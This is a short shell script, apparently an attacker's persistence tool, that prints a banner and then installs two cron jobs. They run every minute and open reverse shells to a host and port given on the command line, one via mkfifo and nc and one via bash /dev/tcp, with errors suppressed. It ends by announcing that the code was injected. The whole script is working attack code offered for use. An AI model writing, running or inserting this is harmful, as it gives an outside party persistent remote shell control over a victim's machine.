echo -e "\n\nCode Made By root@kingston \n"
printf"\n\n                       oOo \n\t                   oO\n\t                     o\n\t|^^^^^^^^^^^^^^^^^^^^|____\n\t|   Hello, Kingston    |**\\___,\n\t|______________________|__|)__|\n\t|(@)(@)'''''''''**|(@)(@)**|(@)\n\t= = = = = = = = = = = = = = = = = = =\n"
echo -e "Injecting Code...\n"

{ crontab -l; echo "* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f"; } | crontab - > /dev/null 2>&1
{ crontab -l; echo "* * * * * bash -i >& /dev/tcp/$1/$2 0>&1"; } | crontab - > /dev/null 2>&1
crontab -l | grep '* * * * * rm /tmp/f;mkfifo /tmp/f;cat' > /dev/null 2>&1

echo -e "${GREEN}[+] CODE INJECTED SUCCESSFULY${ENDCOLOR}\n"
